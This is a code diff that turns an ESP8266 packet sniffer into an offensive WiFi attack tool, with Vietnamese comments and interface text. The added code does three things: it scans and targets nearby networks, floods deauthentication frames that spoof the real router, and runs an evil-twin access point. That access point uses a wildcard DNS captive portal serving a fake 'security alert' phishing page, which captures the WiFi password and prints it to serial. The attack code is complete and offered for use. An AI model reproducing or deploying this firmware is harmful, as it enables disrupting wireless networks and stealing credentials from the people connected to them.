@@ -1,100 +1,125 @@
 #include <ESP8266WiFi.h>
+#include <DNSServer.h>
+#include <ESP8266WebServer.h>
 
 extern "C" {
   #include "user_interface.h"
 }
 
-#define CHANNEL_FIXED 5
-#define SERIAL_BAUD   115200
+// --- CẤU HÌNH ---
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 4, 1);
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
 
-// ---- 802.11 frame control ----
-#define WIFI_TYPE_MGMT 0x00
-#define WIFI_TYPE_CTRL 0x01
-#define WIFI_TYPE_DATA 0x02
+int currentMode = 0; // 0: Idle, 1: Evil Twin, 2: Deauth
+String targetSSID = "WiFi_Bao_Tri_He_Thong";
+int targetChannel = 1;
+uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Mặc định Broadcast
 
-static void ICACHE_FLASH_ATTR promisc_cb(uint8_t *buf, uint16_t len) {
-  if (len < 60) return;
+// Hàm gửi gói tin Deauth
+void sendDeauth() {
+  uint8_t packet[26] = {
+    0xC0, 0x00, 0x3a, 0x01, // Frame Control
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (All)
+    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // Source (Router thật)
+    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // BSSID (Router thật)
+    0x00, 0x00, 0x01, 0x00 // Sequence
+  };
+  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
+}
 
-  // RX control header (first 12 bytes on ESP8266)
-  int8_t rssi = (int8_t)buf[0];
-  uint16_t rx_ctrl_len = 12;
+// Hàm khởi tạo WiFi Bẫy (Evil Twin)
+void startAP() {
+  WiFi.softAPdisconnect();
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(targetSSID.c_str(), NULL, targetChannel);
+  Serial.println("\n[+] Da tao WiFi bay: " + targetSSID + " (Kenh " + String(targetChannel) + ")");
+}
 
-  uint8_t *frame = buf + rx_ctrl_len;
-  uint16_t frame_len = len - rx_ctrl_len;
-
-  // ---- Frame Control ----
-  uint16_t fc = frame[0] | (frame[1] << 8);
-  uint8_t type = (fc >> 2) & 0x03;
-
-  // Chỉ nhận DATA frame
-  if (type != WIFI_TYPE_DATA) return;
-
-  // ---- Header length ----
-  uint8_t header_len = 24;
-
-  // QoS frame → +2 bytes
-  if ((fc & 0x0080) == 0x0080) {
-    header_len += 2;
+// Hàm quét mạng
+void scanWiFi() {
+  Serial.println("\n[*] Dang quet WiFi...");
+  int n = WiFi.scanNetworks();
+  if (n == 0) Serial.println("Khong tim thay mang.");
+  else {
+    for (int i = 0; i < n; ++i) {
+      Serial.printf("[%d] %s | Ch:%d | %s | %ddBm\n", i, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.BSSIDstr(i).c_str(), WiFi.RSSI(i));
+      delay(10);
+    }
+    Serial.println("--> Go 'x:SO_THU_TU' de chon muc tieu.");
   }
-
-  if (frame_len < header_len + 8) return;
-
-  uint8_t *llc = frame + header_len;
-
-  // ---- LLC + SNAP check ----
-  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
-        llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00)) {
-    return;
-  }
-
-  // ---- EtherType ----
-  uint16_t ethertype = (llc[6] << 8) | llc[7];
-  if (ethertype != 0x888E) return;
-
-  // ---- EAPOL payload ----
-  uint8_t *eapol = llc + 8;
-  uint8_t version = eapol[0];
-
-  if (version != 1 && version != 2) return;
-
-  // ---- PASS ALL CHECKS ----
-  Serial.println();
-  Serial.println("=== VALID EAPOL DETECTED ===");
-  Serial.print("RSSI: ");
-  Serial.print(rssi);
-  Serial.print(" dBm | Channel: ");
-  Serial.println(CHANNEL_FIXED);
-
-  Serial.print("EAPOL Version: ");
-  Serial.println(version);
-
-  Serial.println("----------------------------");
 }
 
 void setup() {
-  Serial.begin(SERIAL_BAUD);
-  delay(200);
+  Serial.begin(115200);
+  WiFi.mode(WIFI_AP_STA);
+  startAP();
 
-  Serial.println();
-  Serial.println("ESP8266 Secure EAPOL Sniffer");
-  Serial.println("Security-aware detection enabled");
+  // Trang web lừa đảo
+  String html = "<html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'></head>"
+                "<body style='text-align:center;font-family:sans-serif;margin-top:50px;'>"
+                "<h2>Hệ Thống Cảnh Báo Bảo Mật</h2>"
+                "<p>Phát hiện truy cập bất thường. Vui lòng xác thực mật khẩu WiFi để mở khóa Internet.</p>"
+                "<form action='/post' method='POST'>"
+                "<input type='password' name='pw' style='padding:10px;width:80%;' placeholder='Nhập mật khẩu WiFi...'><br><br>"
+                "<input type='submit' value='Xác Thực Ngay' style='padding:10px;background-color:red;color:white;border:none;'>"
+                "</form><p style='color:grey;font-size:12px;'>Support ID: 8991-FPT-VNPT</p></body></html>";
 
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  delay(100);
+  webServer.on("/", [html]() { webServer.send(200, "text/html", html); });
+  
+  webServer.on("/post", HTTP_POST, []() {
+    String p = webServer.arg("pw");
+    Serial.println("\n\n=================================");
+    Serial.println("[!!!] HUP DUOC PASS: " + p);
+    Serial.println("=================================\n");
+    webServer.send(200, "text/html", "<h1 style='text-align:center;'>Dang kiem tra... Vui long cho 2 phut.</h1>");
+  });
 
-  wifi_set_opmode(STATION_MODE);
+  dnsServer.start(DNS_PORT, "*", apIP);
+  webServer.begin();
+  wifi_promiscuous_enable(1); // Bật chế độ tiêm gói tin
 
-  wifi_promiscuous_enable(0);
-  delay(10);
-
-  wifi_set_channel(CHANNEL_FIXED);
-  wifi_set_promiscuous_rx_cb(promisc_cb);
-  wifi_promiscuous_enable(1);
-
-  Serial.println("Sniffing started.");
+  Serial.println("\n--- EVIL COMBO READY ---");
+  Serial.println("Lenh: scan, x:ID, s:NAME, m1 (Twin), m2 (Deauth), stop");
 }
 
 void loop() {
-  delay(10);
+  // Đọc lệnh từ App Serial
+  if (Serial.available()) {
+    String cmd = Serial.readStringUntil('\n');
+    cmd.trim();
+
+    if (cmd == "scan") { scanWiFi(); }
+    else if (cmd == "m1") { currentMode = 1; Serial.println("-> Mode: EVIL TWIN (Tha thinh)"); }
+    else if (cmd == "m2") { currentMode = 2; Serial.println("-> Mode: DEAUTH (Dam)"); }
+    else if (cmd == "stop") { currentMode = 0; Serial.println("-> STOP All"); }
+    else if (cmd.startsWith("s:")) { 
+      targetSSID = cmd.substring(2); 
+      startAP(); 
+    }
+    else if (cmd.startsWith("x:")) {
+      int id = cmd.substring(2).toInt();
+      if(id >= 0) {
+        targetChannel = WiFi.channel(id);
+        String bssid = WiFi.BSSIDstr(id);
+        // Lưu MAC mục tiêu
+        sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target_mac[0], &target_mac[1], &target_mac[2], &target_mac[3], &target_mac[4], &target_mac[5]);
+        wifi_set_channel(targetChannel);
+        startAP(); // Khởi động lại AP trên kênh mới
+        Serial.println("[+] Da khoa muc tieu: " + WiFi.SSID(id));
+      }
+    }
+  }
+
+  // Xử lý chế độ
+  if (currentMode == 1) { // Evil Twin
+    dnsServer.processNextRequest();
+    webServer.handleClient();
+  } 
+  else if (currentMode == 2) { // Deauth
+    // Gửi 10 gói rồi nghỉ xíu để còn nhận lệnh stop
+    for(int k=0; k<10; k++) { sendDeauth(); delay(2); }
+    webServer.handleClient(); 
+  }
 }
